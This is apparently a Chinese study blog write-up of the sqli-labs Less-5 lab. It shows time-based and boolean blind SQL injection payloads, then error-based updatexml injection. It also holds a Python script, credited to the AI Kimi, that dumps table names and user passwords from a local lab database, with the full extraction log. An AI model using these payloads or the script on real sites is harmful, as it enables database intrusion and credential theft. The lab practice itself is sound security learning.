<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lasso">  <br>看csdn上，可以用length根据是否有You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..来判断；  <br><br>也能用<span class="hljs-literal">and</span> <span class="hljs-keyword">if</span> sleep的时间延迟来判断；<br><br>根据前几题大概知道数据库名称为<span class="hljs-string">&#x27;security&#x27;</span>为<span class="hljs-number">8</span>个字符；  <br><br>payload：<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(5),1)–+  </p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><br>payload的逻辑是先用<span class="hljs-keyword">length</span>判断当前所在数据库的名字长度，<br>&gt;如果猜对为<span class="hljs-number">8</span>，则让回显延迟<span class="hljs-number">5</span>秒，此时因为使用了<span class="hljs-keyword">and</span>，<span class="hljs-keyword">and</span>的右边无法满足布尔值为真，所以不会有回显<br>什么也没有回显，说明猜测字符长度正确；<br><br>&gt;如果猜测错误，则会使得<span class="hljs-keyword">if</span>返回<span class="hljs-number">1</span>，让<span class="hljs-keyword">and</span>的两边满足全为真，使得服务器返回‘you are in......’<br><br>其中用到了<span class="hljs-keyword">if</span>函数和<span class="hljs-keyword">sleep</span>函数,  <br><span class="hljs-keyword">sleep</span>()函数是让回显延迟指定的时间吧；  <br><br>回到payload<br><br>按照我们设置的延迟可确认确实为<span class="hljs-number">8</span>个字符，也就是<span class="hljs-string">&#x27;security&#x27;</span><br><br>试了一下<br><br>id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length(database())=&#x27;</span>security<span class="hljs-string">&#x27;,sleep(5),1)--+id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">length</span>(database())=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><br>问了kimi，原来是<span class="hljs-keyword">length</span>()函数只会返回整型数值，而我要用它来对比字符串😅  <br><br>**然后是<span class="hljs-keyword">substr</span>()函数**  <br><br></code></pre></td></tr></table></figure>
<p>SUBSTR(string, start, length)</p>
<p>string：原始字符串。<br>start：子字符串的起始位置（从 1 开始计数）。<br>length：要提取的子字符串的长度。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>
<p>ASCII(character_expression)</p>
<p>character_expression：可以是单个字符、字符串字面值或列名。该参数必须是字符类型（如 CHAR 或 VARCHAR）。</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">一定要转成<span class="hljs-keyword">ascii</span>吗？  <br>试了一下<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’ and if(substr(database(),1,1)&#x3D;’s’,sleep(5),1)–+</p>
<p>?id&#x3D;1’ and if(substr(database(),1,8)&#x3D;’security’,sleep(5),1)–+</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">确实能直接猜测字符了!<br><br>如果有python脚本的话<span class="hljs-params">...</span><span class="hljs-params">...</span>  <br>k：有的兄弟，有的<br><br>KIMI：  <br><br></code></pre></td></tr></table></figure>
<p>import requests<br>&#x2F;&#x2F;配置<br>TARGET_URL &#x3D; “<a target="_blank" rel="noopener" href="http://localhost:32768/Less-5/">http://localhost:32768/Less-5/</a>“  &#x2F;&#x2F; 目标URL<br>TRUE_STRING &#x3D; “You are in………..”  &#x2F;&#x2F; 数据库判断成功的响应标志<br>CHARSET &#x3D; “abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!”  &#x2F;&#x2F; 测试字符集<br>HEADERS &#x3D; {<br>    “User-Agent”: “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;58.0.3029.110 Safari&#x2F;537.3”<br>}</p>
<p>&#x2F;&#x2F;发送请求<br>def send_payload(payload):<br>    url &#x3D; f”{TARGET_URL}?id&#x3D;1’ AND {payload} –+”<br>    response &#x3D; requests.get(url, headers&#x3D;HEADERS)<br>    return response.text<br>&#x2F;&#x2F; 获取长度<br>def get_length(query):<br>    length &#x3D; 0<br>    while True:<br>        payload &#x3D; f”LENGTH({query})&#x3D;{length}”<br>        response &#x3D; send_payload(payload)<br>        if TRUE_STRING in response:<br>            print(f”[+] 长度为: {length}”)<br>            return length<br>        length +&#x3D; 1<br>&#x2F;&#x2F; 逐字符获取字符串<br>def get_string(query, length):<br>    result &#x3D; “”<br>    for i in range(1, length + 1):<br>        print(f”[+] 获取第 {i} 个字符…”)<br>        for char in CHARSET:<br>            payload &#x3D; f”SUBSTR({query},{i},1)&#x3D;’{char}’”<br>            response &#x3D; send_payload(payload)<br>            if TRUE_STRING in response:<br>                result +&#x3D; char<br>                print(f”[+] 当前结果: {result}”)<br>                break<br>    return result</p>
<p>&#x2F;&#x2F; 主函数<br>def main():<br>    &#x2F;&#x2F; 获取数据库名<br>    db_length &#x3D; get_length(“DATABASE()”)<br>    db_name &#x3D; get_string(“DATABASE()”, db_length)<br>    print(f”[+] 数据库名: {db_name}”)</p>
<pre><code class="hljs">// 获取表名
table_count = 0
while True:
    payload = f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=&#123;table_count&#125;&quot;
    response = send_payload(payload)
    if TRUE_STRING in response:
        break
    table_count += 1
print(f&quot;[+] 表数量: &#123;table_count&#125;&quot;)

// 获取所有表名
table_names = []
for i in range(table_count):
    tbl_length = get_length(f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;)
    tbl_name = get_string(f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;, tbl_length)
    table_names.append(tbl_name)
    print(f&quot;[+] 表名: &#123;tbl_name&#125;&quot;)

// 获取字段名（以users表为例）
target_table = &quot;users&quot;  // 替换为目标表名
print(f&quot;[+] 获取&#123;target_table&#125;表的字段...&quot;)
field_count = 0
while True:
    payload = f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE())=&#123;field_count&#125;&quot;
    response = send_payload(payload)
    if TRUE_STRING in response:
        break
    field_count += 1
print(f&quot;[+] 字段数量: &#123;field_count&#125;&quot;)

// 获取字段名
field_names = []
for i in range(field_count):
    fld_length = get_length(f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;)
    fld_name = get_string(f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;, fld_length)
    field_names.append(fld_name)
    print(f&quot;[+] 字段名: &#123;fld_name&#125;&quot;)

// 获取数据
print(f&quot;[+] 获取&#123;target_table&#125;表的数据...&quot;)
for i in range(field_count):
    if field_names[i] in [&quot;username&quot;, &quot;password&quot;]:  // 获取用户名和密码字段
        print(f&quot;[+] 获取字段: &#123;field_names[i]&#125;&quot;)
        data_count = 0
        while True:
            payload = f&quot;(SELECT COUNT(*) FROM &#123;target_table&#125;)=&#123;data_count&#125;&quot;
            response = send_payload(payload)
            if TRUE_STRING in response:
                break
            data_count += 1
        print(f&quot;[+] 数据条数: &#123;data_count&#125;&quot;)

        for j in range(data_count):
            data_length = get_length(f&quot;(SELECT &#123;field_names[i]&#125; FROM &#123;target_table&#125; LIMIT &#123;j&#125;,1)&quot;)
            data = get_string(f&quot;(SELECT &#123;field_names[i]&#125; FROM &#123;target_table&#125; LIMIT &#123;j&#125;,1)&quot;, data_length)
            print(f&quot;[+] 数据[&#123;j+1&#125;]: &#123;data&#125;&quot;)
</code></pre>
<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    main()</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos"><br>这是直接猜测字符而不猜测其<span class="hljs-keyword">ascii</span>码的    <br>改了一下  <br></code></pre></td></tr></table></figure>
<p>sr &#x3D; string.printable<br>CHARSET &#x3D; sr  &#x2F;&#x2F;“abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!”  &#x2F;&#x2F; 测试字符集</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">因为我也不敢确定ai给出的字符是完整且编码正确的  <br><br>恕我只是个脚本小子，能学懂原理先吧  <br><br>运行结果<br></code></pre></td></tr></table></figure>
<p>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: se<br>[+] 获取第 3 个字符…<br>[+] 当前结果: sec<br>[+] 获取第 4 个字符…<br>[+] 当前结果: secu<br>[+] 获取第 5 个字符…<br>[+] 当前结果: secur<br>[+] 获取第 6 个字符…<br>[+] 当前结果: securi<br>[+] 获取第 7 个字符…<br>[+] 当前结果: securit<br>[+] 获取第 8 个字符…<br>[+] 当前结果: security<br>[+] 数据库名: security<br>[+] 表数量: 4<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: e<br>[+] 获取第 2 个字符…<br>[+] 当前结果: em<br>[+] 获取第 3 个字符…<br>[+] 当前结果: ema<br>[+] 获取第 4 个字符…<br>[+] 当前结果: emai<br>[+] 获取第 5 个字符…<br>[+] 当前结果: email<br>[+] 获取第 6 个字符…<br>[+] 当前结果: emails<br>[+] 表名: emails<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: r<br>[+] 获取第 2 个字符…<br>[+] 当前结果: re<br>[+] 获取第 3 个字符…<br>[+] 当前结果: ref<br>[+] 获取第 4 个字符…<br>[+] 当前结果: refe<br>[+] 获取第 5 个字符…<br>[+] 当前结果: refer<br>[+] 获取第 6 个字符…<br>[+] 当前结果: refere<br>[+] 获取第 7 个字符…<br>[+] 当前结果: referer<br>[+] 获取第 8 个字符…<br>[+] 当前结果: referers<br>[+] 表名: referers<br>[+] 长度为: 7<br>[+] 获取第 1 个字符…<br>[+] 当前结果: u<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ua<br>[+] 获取第 3 个字符…<br>[+] 当前结果: uag<br>[+] 获取第 4 个字符…<br>[+] 当前结果: uage<br>[+] 获取第 5 个字符…<br>[+] 当前结果: uagen<br>[+] 获取第 6 个字符…<br>[+] 当前结果: uagent<br>[+] 获取第 7 个字符…<br>[+] 当前结果: uagents<br>[+] 表名: uagents<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: u<br>[+] 获取第 2 个字符…<br>[+] 当前结果: us<br>[+] 获取第 3 个字符…<br>[+] 当前结果: use<br>[+] 获取第 4 个字符…<br>[+] 当前结果: user<br>[+] 获取第 5 个字符…<br>[+] 当前结果: users<br>[+] 表名: users<br>[+] 获取users表的字段…<br>[+] 字段数量: 3<br>[+] 长度为: 2<br>[+] 获取第 1 个字符…<br>[+] 当前结果: i<br>[+] 获取第 2 个字符…<br>[+] 当前结果: id<br>[+] 字段名: id<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: u<br>[+] 获取第 2 个字符…<br>[+] 当前结果: us<br>[+] 获取第 3 个字符…<br>[+] 当前结果: use<br>[+] 获取第 4 个字符…<br>[+] 当前结果: user<br>[+] 获取第 5 个字符…<br>[+] 当前结果: usern<br>[+] 获取第 6 个字符…<br>[+] 当前结果: userna<br>[+] 获取第 7 个字符…<br>[+] 当前结果: usernam<br>[+] 获取第 8 个字符…<br>[+] 当前结果: username<br>[+] 字段名: username<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: p<br>[+] 获取第 2 个字符…<br>[+] 当前结果: pa<br>[+] 获取第 3 个字符…<br>[+] 当前结果: pas<br>[+] 获取第 4 个字符…<br>[+] 当前结果: pass<br>[+] 获取第 5 个字符…<br>[+] 当前结果: passw<br>[+] 获取第 6 个字符…<br>[+] 当前结果: passwo<br>[+] 获取第 7 个字符…<br>[+] 当前结果: passwor<br>[+] 获取第 8 个字符…<br>[+] 当前结果: password<br>[+] 字段名: password<br>[+] 获取users表的数据…<br>[+] 获取字段: username<br>[+] 数据条数: 13<br>[+] 长度为: 4<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumb<br>[+] 数据[1]: dumb<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: an<br>[+] 获取第 3 个字符…<br>[+] 当前结果: ang<br>[+] 获取第 4 个字符…<br>[+] 当前结果: ange<br>[+] 获取第 5 个字符…<br>[+] 当前结果: angel<br>[+] 获取第 6 个字符…<br>[+] 当前结果: angeli<br>[+] 获取第 7 个字符…<br>[+] 当前结果: angelin<br>[+] 获取第 8 个字符…<br>[+] 当前结果: angelina<br>[+] 数据[2]: angelina<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumm<br>[+] 获取第 5 个字符…<br>[+] 当前结果: dummy<br>[+] 数据[3]: dummy<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: se<br>[+] 获取第 3 个字符…<br>[+] 当前结果: sec<br>[+] 获取第 4 个字符…<br>[+] 当前结果: secu<br>[+] 获取第 5 个字符…<br>[+] 当前结果: secur<br>[+] 获取第 6 个字符…<br>[+] 当前结果: secure<br>[+] 数据[4]: secure<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: st<br>[+] 获取第 3 个字符…<br>[+] 当前结果: stu<br>[+] 获取第 4 个字符…<br>[+] 当前结果: stup<br>[+] 获取第 5 个字符…<br>[+] 当前结果: stupi<br>[+] 获取第 6 个字符…<br>[+] 当前结果: stupid<br>[+] 数据[5]: stupid<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: su<br>[+] 获取第 3 个字符…<br>[+] 当前结果: sup<br>[+] 获取第 4 个字符…<br>[+] 当前结果: supe<br>[+] 获取第 5 个字符…<br>[+] 当前结果: super<br>[+] 获取第 6 个字符…<br>[+] 当前结果: superm<br>[+] 获取第 7 个字符…<br>[+] 当前结果: superma<br>[+] 获取第 8 个字符…<br>[+] 当前结果: superman<br>[+] 数据[6]: superman<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: b<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ba<br>[+] 获取第 3 个字符…<br>[+] 当前结果: bat<br>[+] 获取第 4 个字符…<br>[+] 当前结果: batm<br>[+] 获取第 5 个字符…<br>[+] 当前结果: batma<br>[+] 获取第 6 个字符…<br>[+] 当前结果: batman<br>[+] 数据[7]: batman<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 数据[8]: admin<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin1<br>[+] 数据[9]: admin1<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin2<br>[+] 数据[10]: admin2<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin3<br>[+] 数据[11]: admin3<br>[+] 长度为: 7<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: dh<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dha<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dhak<br>[+] 获取第 5 个字符…<br>[+] 当前结果: dhakk<br>[+] 获取第 6 个字符…<br>[+] 当前结果: dhakka<br>[+] 获取第 7 个字符…<br>[+] 当前结果: dhakkan<br>[+] 数据[12]: dhakkan<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin4<br>[+] 数据[13]: admin4<br>[+] 获取字段: password<br>[+] 数据条数: 13<br>[+] 长度为: 4<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumb<br>[+] 数据[1]: dumb<br>[+] 长度为: 10<br>[+] 获取第 1 个字符…<br>[+] 当前结果: i<br>[+] 获取第 2 个字符…<br>[+] 当前结果: i-<br>[+] 获取第 3 个字符…<br>[+] 当前结果: i-k<br>[+] 获取第 4 个字符…<br>[+] 当前结果: i-ki<br>[+] 获取第 5 个字符…<br>[+] 当前结果: i-kil<br>[+] 获取第 6 个字符…<br>[+] 当前结果: i-kill<br>[+] 获取第 7 个字符…<br>[+] 当前结果: i-kill-<br>[+] 获取第 8 个字符…<br>[+] 当前结果: i-kill-y<br>[+] 获取第 9 个字符…<br>[+] 当前结果: i-kill-yo<br>[+] 获取第 10 个字符…<br>[+] 当前结果: i-kill-you<br>[+] 数据[2]: i-kill-you<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: p<br>[+] 获取第 2 个字符…<br>[+] 当前结果: p@<br>[+] 获取第 3 个字符…<br>[+] 当前结果: p@s<br>[+] 获取第 4 个字符…<br>[+] 当前结果: p@ss<br>[+] 获取第 5 个字符…<br>[+] 当前结果: p@ssw<br>[+] 获取第 6 个字符…<br>[+] 当前结果: p@sswo<br>[+] 获取第 7 个字符…<br>[+] 当前结果: p@sswor<br>[+] 获取第 8 个字符…<br>[+] 当前结果: p@ssword<br>[+] 数据[3]: p@ssword<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: c<br>[+] 获取第 2 个字符…<br>[+] 当前结果: cr<br>[+] 获取第 3 个字符…<br>[+] 当前结果: cra<br>[+] 获取第 4 个字符…<br>[+] 当前结果: crap<br>[+] 获取第 5 个字符…<br>[+] 当前结果: crapp<br>[+] 获取第 6 个字符…<br>[+] 当前结果: crappy<br>[+] 数据[4]: crappy<br>[+] 长度为: 9<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: st<br>[+] 获取第 3 个字符…<br>[+] 当前结果: stu<br>[+] 获取第 4 个字符…<br>[+] 当前结果: stup<br>[+] 获取第 5 个字符…<br>[+] 当前结果: stupi<br>[+] 获取第 6 个字符…<br>[+] 当前结果: stupid<br>[+] 获取第 7 个字符…<br>[+] 当前结果: stupidi<br>[+] 获取第 8 个字符…<br>[+] 当前结果: stupidit<br>[+] 获取第 9 个字符…<br>[+] 当前结果: stupidity<br>[+] 数据[5]: stupidity<br>[+] 长度为: 7<br>[+] 获取第 1 个字符…<br>[+] 当前结果: g<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ge<br>[+] 获取第 3 个字符…<br>[+] 当前结果: gen<br>[+] 获取第 4 个字符…<br>[+] 当前结果: geni<br>[+] 获取第 5 个字符…<br>[+] 当前结果: genio<br>[+] 获取第 6 个字符…<br>[+] 当前结果: geniou<br>[+] 获取第 7 个字符…<br>[+] 当前结果: genious<br>[+] 数据[6]: genious<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: m<br>[+] 获取第 2 个字符…<br>[+] 当前结果: mo<br>[+] 获取第 3 个字符…<br>[+] 当前结果: mob<br>[+] 获取第 4 个字符…<br>[+] 当前结果: mob!<br>[+] 获取第 5 个字符…<br>[+] 当前结果: mob!l<br>[+] 获取第 6 个字符…<br>[+] 当前结果: mob!le<br>[+] 数据[7]: mob!le<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 数据[8]: admin<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin1<br>[+] 数据[9]: admin1<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin2<br>[+] 数据[10]: admin2<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin3<br>[+] 数据[11]: admin3<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumb<br>[+] 获取第 5 个字符…<br>[+] 当前结果: dumbo<br>[+] 数据[12]: dumbo<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin4<br>[+] 数据[13]: admin4</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">### bp盲注爆破<br>csdn上看到可以直接不用写脚本直接用bp看返回长度来爆破的  <br>看来也可以不用<span class="hljs-keyword">if</span>函数来构造payload<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’and substr(database(),1,1) &#x3D;’s’–+</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">能达到同样效果<br><br>bp爆破的话payload设置的前后和循序有点难搞，但是原理知道了可以一次一次慢慢试；<br><br>## <span class="hljs-type">xml</span>报错注入<br><br>前提是在有<span class="hljs-keyword">sql</span>报错信息输出的前提下（存在print_r(mysql_error())函数）<br><br>在高版本MySQL（<span class="hljs-number">5.1</span>）中添加了对<span class="hljs-type">xml</span>文档进行查询和修改的函数<br><br><span class="hljs-keyword">update</span>函数：<br></code></pre></td></tr></table></figure>
<p>UPDATEXML(xml_target, xpath_expr, new_xml)</p>
<p>xml_target：要更新的XML文档。<br>xpath_expr：XPath表达式，用于定位需要更新的节点。<br>new_xml：新的XML片段或值，用于替换目标节点的值。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">extractvalue</span>函数：<br></code></pre></td></tr></table></figure>
<p>EXTRACTVALUE(xml_target, xpath_expr)</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">原理是用<span class="hljs-keyword">xpath</span>的非法字符报错<br>KIMI：<br>&gt;updatexml()和extractvalue()函数在处理XML数据时，会使用<span class="hljs-keyword">XPath</span>表达式来定位或提取节点。如果<span class="hljs-keyword">XPath</span>表达式不符合语法规范，MySQL会返回错误信息。攻击者可以利用这一特性，通过拼接恶意的<span class="hljs-keyword">XPath</span>表达式，使数据库报错，并在错误信息中泄露敏感数据。  <br><br>流程：  <br><br><span class="hljs-number">1</span>.判断闭合点  <br><span class="hljs-number">2</span>.判断是否存在xml报错注入：  <br>使用**updatexml**<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’ and updatexml(1,0x7e,1) –+<br>0x7e 是 ~ 的16进制表示，用来进行绕过，字符串替换成十六进制数有一定的绕过作用</p>
<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">成功回显<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-variable constant_">XPATH</span> syntax <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;~&#x27;</span>  </span><br><br>说明存在报错注入<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1) –+</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt;爆库名<br><br><span class="hljs-strong">***note**</span>* <br><br>concat和group<span class="hljs-emphasis">_concat有什么区别,问了kimi，  </span><br><span class="hljs-emphasis">***我总结就是concat用来拼接字符串，group_</span>concat用来拼接表中的内容<span class="hljs-strong">***</span><br><br>然后就是走注入流程  <br><br>爆表名<br></code></pre></td></tr></table></figure>
